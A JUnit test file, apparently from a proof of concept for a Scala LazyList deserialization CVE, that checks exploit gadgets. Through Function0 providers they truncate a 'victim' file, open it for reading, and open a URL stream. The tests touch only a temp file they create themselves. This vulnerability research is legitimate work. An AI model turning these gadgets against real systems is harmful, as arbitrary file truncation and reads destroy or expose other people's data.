package poc.cve.lazylist.function0;

import org.junit.Before;
import org.junit.Test;
import scala.Function0;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.nio.charset.StandardCharsets;

import static org.junit.Assert.*;

public class DefaultProvidersTest {
    private final byte[] initialFileData = "Some text data.".getBytes(StandardCharsets.UTF_8);
    private File victimFile;
    @Before
    public void setUp() throws IOException {
        // Given: victim file with some initial data inside
        victimFile = File.createTempFile("victim-file-", "-tmp");
        victimFile.deleteOnExit();
        try (FileOutputStream fos = new FileOutputStream(victimFile)) {
            fos.write(initialFileData);
            fos.flush();
        }
        assertEquals(initialFileData.length, victimFile.length());
    }

    @Test
    public void fileOutTest() {
        // When: FILE_OUTPUT function0 with given file name and append = false called
        String fileName = victimFile.getAbsolutePath();
        boolean append = false;
        Function0<Object> function0 = DefaultProviders.FILE_OUTPUT.apply(new Object[] {fileName, append});
        function0.apply();

        // Then: given victim file is truncated and has 0 length
        assertEquals(0, victimFile.length());
    }

    @Test
    public void fileInTest() throws IOException {
        // When: FILE_INPUT function0 with given file name called
        String fileName = victimFile.getAbsolutePath();
        Function0<Object> function0 = DefaultProviders.FILE_INPUT.apply(new Object[] {fileName});
        Object result = function0.apply();

        // Then: result is new FileInputStream(fileName)
        assertTrue(result instanceof FileInputStream);
        FileInputStream fis = (FileInputStream) result;
        byte[] actualFileData = new byte[initialFileData.length];
        int read = fis.read(actualFileData);
        assertEquals(initialFileData.length, read);
        assertArrayEquals(initialFileData, actualFileData);
    }

    @Test
    public void urlInputTest() throws IOException {
        // When: URL_INPUT function0 with some URL called
        String url = "file:" + victimFile.getAbsolutePath();
        Function0<Object> function0 = DefaultProviders.URL_INPUT.apply(new Object[]{url});
        Object result = function0.apply();

        // Then: url.openStream() is called
        assertTrue(result instanceof InputStream);
        InputStream is = (InputStream) result;
        byte[] actualFileData = new byte[initialFileData.length];
        int read = is.read(actualFileData);
        assertEquals(initialFileData.length, read);
        assertArrayEquals(initialFileData, actualFileData);
    }
}